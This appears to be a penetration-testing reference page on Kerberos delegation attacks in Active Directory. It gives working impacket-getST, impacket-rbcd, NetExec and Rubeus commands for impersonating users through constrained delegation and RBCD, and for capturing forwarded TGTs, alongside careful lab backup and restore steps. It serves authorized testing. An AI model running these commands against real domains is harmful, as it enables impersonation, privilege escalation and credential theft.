# Kerberos delegation

[← AD quick reference](../05-active-directory.md) · [PowerView discovery](powerview.md#delegation) · [Ticket handling](tickets.md) · [Object rights](object-rights.md)

Record the controlled account, its SID and key/ticket, the target service account, exact SPN, impersonated user, and DC. Delegation grants a way to authenticate to a service as another principal. The service still applies that principal's permissions.

## Choose the path from the configuration

| Configuration | Where to look | What must be controlled or available |
| --- | --- | --- |
| Classic constrained delegation | `msDS-AllowedToDelegateTo` on the front-end principal | Front-end key/TGT, an allowed target SPN, and suitable evidence for S4U2Proxy |
| Protocol transition | `TRUSTED_TO_AUTH_FOR_DELEGATION` (`0x1000000`) on that principal | Allows the usual S4U2Self → forwardable evidence-ticket chain; check target-user restrictions |
| Resource-based constrained delegation (RBCD) | `msDS-AllowedToActOnBehalfOfOtherIdentity` on the back-end principal | Existing permission for a controlled service principal, or an effective right to modify this exact descriptor |
| Unconstrained delegation | `TRUSTED_FOR_DELEGATION` (`0x80000`) on a service principal | Control of the service/host and an actual delegable Kerberos authentication that forwards a TGT |

RBCD reverses the configuration direction: the back-end decides which front ends it trusts. A readable descriptor is discovery evidence; it is not permission to edit it. [Microsoft delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview).

S4U2Self can work without the protocol-transition flag, but the resulting evidence ticket and S4U2Proxy requirements differ between classic delegation and RBCD. Do not treat a missing flag as proof that every delegation route fails. [Original RBCD research](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html).

## Enumerate and confirm the exact principals

From Kali with one known credential:

```bash
nxc ldap <DC-FQDN> -d <DOMAIN.TLD> -u <USER> -p '<PASSWORD>' --find-delegation
```

From a Windows shell, load the [pinned PowerView](powerview.md#load-and-scope) and use its scoped delegation queries. With the AD module available, inspect a selected computer and user directly:

```powershell
$DC = 'dc01.corp.example'
Get-ADComputer -Identity 'APP01' -Server $DC -Properties `
    servicePrincipalName,userAccountControl,'msDS-AllowedToDelegateTo',`
    'msDS-AllowedToActOnBehalfOfOtherIdentity',PrincipalsAllowedToDelegateToAccount |
    Format-List Name,SID,servicePrincipalName,userAccountControl,`
        'msDS-AllowedToDelegateTo',PrincipalsAllowedToDelegateToAccount
Get-ADUser -Identity 'svc_web' -Server $DC -Properties `
    servicePrincipalName,userAccountControl,'msDS-AllowedToDelegateTo' |
    Format-List SamAccountName,SID,servicePrincipalName,userAccountControl,'msDS-AllowedToDelegateTo'
setspn.exe -Q cifs/fs01.corp.example
```

Confirm the SPN is registered to the account whose key the service uses. Inspect the impersonated user's `AccountNotDelegated`/group state; members of Protected Users and accounts marked sensitive for delegation can reject the expected delegation chain. Use an ordinary lab principal first. [Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group).

Keep FQDNs, DNS, time, and encryption types consistent with [Kerberos troubleshooting](kerberos-troubleshooting.md). A service account does not need to be cracked if its valid key or TGT is already controlled.

## Classic constrained delegation: request and prove service access

Example prerequisites: `svc_web` is controlled, has its own registered SPN, has protocol transition enabled, and its allowed-SPN list includes `cifs/fs01.corp.example`. The selected `labreader` can access the `LabEvidence` share on FS01 and is delegable.

```bash
# Password prompt; the key used belongs to svc_web.
impacket-getST -dc-ip <DC-IP> -spn cifs/fs01.corp.example \
  -impersonate labreader 'corp.example/svc_web'

# Use the actual cache filename printed by getST, which varies by release.
(
  export KRB5CCNAME='/absolute/path/to/printed-ticket.ccache'
  klist -c "$KRB5CCNAME"
  impacket-smbclient -k -no-pass 'corp.example/labreader@fs01.corp.example'
)
```

In the SMB console:

```text
shares
use LabEvidence
ls
exit
```

Expected evidence is a ticket whose client is `labreader` and server is the requested CIFS SPN, followed by a successful directory listing on a resource with known permissions for that user. Confirm the server's authenticated principal from available logs when needed. Listing a share does not prove local administrator rights or remote execution. The subshell restores the parent shell's previous cache environment; remove only this newly created cache after retaining required evidence.

For a controlled AES key, use `-aesKey <HEX-KEY> -no-pass`; an NT key uses `-hashes :<NT-HASH>`. Those keys belong to the delegating account, not the impersonated user. [Impacket getST options](https://github.com/fortra/impacket/blob/master/examples/getST.py).

If classic delegation is configured for Kerberos only, the simple protocol-transition example may fail. An existing forwardable service ticket for the user to the front end can supply evidence via `-additional-ticket <FILE>`. Inspect what the installed tool expects before combining caches and evidence tickets; do not default to a patch-dependent `-force-forwardable` bypass. [Rubeus S4U workflows](https://github.com/GhostPack/Rubeus#s4u).

## RBCD: preserve the descriptor, add one principal, restore

This example uses an **existing** controlled computer account `LABWEB$`. Confirm its password/key/TGT, SPNs, and SID before editing FS01. Domain machine-account quota alone is not proof that this user can create a computer in a particular container.

First capture the raw original descriptor from a Windows shell with the AD module. Use the same DC for changes and readback:

```powershell
$DC = 'dc01.corp.example'
$OperatorCred = Get-Credential -UserName 'CORP\operator' -Message 'RBCD read/write credential'
$Target = 'FS01'
$Attribute = 'msDS-AllowedToActOnBehalfOfOtherIdentity'
$OriginalObject = Get-ADComputer -Identity $Target -Server $DC -Credential $OperatorCred `
    -Properties $Attribute -ErrorAction Stop
$OriginalBytes = $OriginalObject.$Attribute
if ($null -ne $OriginalBytes -and $OriginalBytes -isnot [byte[]]) {
    throw 'This AD module did not return raw bytes; obtain a raw LDAP/LDIF backup before editing.'
}
$Backup = [pscustomobject]@{
    TargetDN = $OriginalObject.DistinguishedName
    DC = $DC
    WasPresent = ($null -ne $OriginalBytes)
    Base64 = if ($null -ne $OriginalBytes) {
        [Convert]::ToBase64String([byte[]]$OriginalBytes)
    } else { $null }
}
$Backup | Export-Clixml -Path '.\FS01-rbcd-before.xml' -ErrorAction Stop
```

Establish attribute-read access before interpreting a null value as original absence; LDAP can omit unreadable attributes without a terminating error. A failed or untrusted backup cannot justify clearing the attribute later. This file contains the actual bytes and absence/presence state. A formatted SID list alone is not a descriptor backup. Keep the backup available to the same operator who will restore it. If the AD module is unavailable, obtain an equivalent raw LDAP/LDIF backup before mutation.

Read the current allowed principals from Kali, then proceed only if the controlled SID was absent and effective attribute-write permission is confirmed:

```bash
impacket-rbcd -dc-ip <DC-IP> -dc-host dc01.corp.example -ldaps \
  -delegate-to 'FS01$' -action read 'corp.example/operator'
impacket-rbcd -dc-ip <DC-IP> -dc-host dc01.corp.example -ldaps \
  -delegate-to 'FS01$' -delegate-from 'LABWEB$' -action write 'corp.example/operator'

impacket-getST -dc-ip <DC-IP> -spn cifs/fs01.corp.example \
  -impersonate labreader 'corp.example/LABWEB$'
```

Use the printed cache and the same SMB read proof as above. In the reviewed Impacket implementation, `write` adds the controlled SID to the existing descriptor, while `remove` removes entries matching that SID. `flush` clears the whole allowed list and is unsuitable for ordinary cleanup of a shared configuration. [Impacket RBCD implementation](https://github.com/fortra/impacket/blob/master/examples/rbcd.py).

After the proof, remove only the newly added SID:

```bash
impacket-rbcd -dc-ip <DC-IP> -dc-host dc01.corp.example -ldaps \
  -delegate-to 'FS01$' -delegate-from 'LABWEB$' -action remove 'corp.example/operator'
impacket-rbcd -dc-ip <DC-IP> -dc-host dc01.corp.example -ldaps \
  -delegate-to 'FS01$' -action read 'corp.example/operator'
```

Check the raw attribute against the backup. Removing an ACE can leave an empty descriptor where the original attribute was absent. In a lab without intervening changes, restore the exact state with the saved bytes:

```powershell
$Saved = Import-Clixml '.\FS01-rbcd-before.xml' -ErrorAction Stop
$Attribute = 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# If reconnecting, obtain CORP\operator's credential again.
if ($Saved.WasPresent) {
    $Bytes = [Convert]::FromBase64String($Saved.Base64)
    Set-ADComputer -Identity $Saved.TargetDN -Server $Saved.DC -Credential $OperatorCred -Replace @{
        'msDS-AllowedToActOnBehalfOfOtherIdentity' = $Bytes
    } -ErrorAction Stop
} else {
    Set-ADComputer -Identity $Saved.TargetDN -Server $Saved.DC -Credential $OperatorCred `
        -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -ErrorAction Stop
}
$After = (Get-ADComputer -Identity $Saved.TargetDN -Server $Saved.DC -Credential $OperatorCred `
    -Properties $Attribute -ErrorAction Stop).$Attribute
if ($Saved.WasPresent) {
    [Convert]::ToBase64String([byte[]]$After) -eq $Saved.Base64
} else { $null -eq $After }
```

A `True` result confirms equality for this attribute on that DC. If another operator changed the descriptor during the exercise, reconcile changes rather than overwrite them with a stale snapshot. [Set-ADComputer attribute operations](https://learn.microsoft.com/en-us/powershell/module/activedirectory/set-adcomputer).

## Unconstrained delegation: validate that a TGT is really forwarded

An unconstrained computer flag is a lead, especially on a member server. DCs commonly appear in enumeration; separate them from hosts you actually control. The path needs access to the relevant logon material on the controlled host and a delegable **Kerberos** authentication to its service.

In an isolated lab, use an elevated session on APP01 and a normal delegable test user. Monitor that user's tickets:

```powershell
.\Rubeus.exe monitor /targetuser:labreader /interval:5 /nowrap
```

From the labreader session on a different domain host, access an existing APP01 share by its registered FQDN:

```cmd
dir \\app01.corp.example\LabShare
```

Inspect the monitor output for the client, realm, times, and `krbtgt/<REALM>` server principal. A CIFS service ticket alone does not establish that the user's TGT was forwarded. An authentication that negotiates NTLM does not supply a Kerberos TGT through this mechanism. [Rubeus monitoring](https://github.com/GhostPack/Rubeus#monitor).

For a controlled captured TGT, use [ticket handling](tickets.md) from a separate disposable logon session and verify only a known permitted resource. Stop the monitor, exit the disposable session, and remove created ticket files when finished. Keep credential-bearing evidence in protected storage; do not purge unrelated users' sessions to clean up a lab.

## Failure diagnosis

| Symptom | Check next |
| --- | --- |
| `KDC_ERR_BADOPTION` | Delegation direction, allowed SPN, evidence forwardability, impersonated-user restrictions, and whether classic or RBCD applies |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Exact SPN registration, duplicates, service class, FQDN, and realm |
| `KDC_ERR_ETYPE_NOSUPP` | Available key type, account-supported encryption, and DC configuration/patch state |
| RBCD edit denied | Effective attribute right, object-specific ACEs, inherited deny, exact target, LDAP protection, and active credential |
| Ticket issued, SMB denied | Cache client/server, explicit Kerberos use, share/NTFS rights, and target identity |
| Unconstrained monitor sees nothing | Actual Kerberos authentication, forwarded TGT, privileges to inspect other logons, user protections, and trigger timing |

## Version and validation notes

Command options were checked against upstream Impacket, NetExec, and Rubeus documentation/source on 2026-10-02. Record installed versions with `python3 -m pip show impacket netexec`, `nxc --version`, and the Rubeus banner; inspect `impacket-getST -h` and `impacket-rbcd -h`. Windows/DC execution and restoration require an isolated lab; the repository does not claim those were executed during documentation preparation.
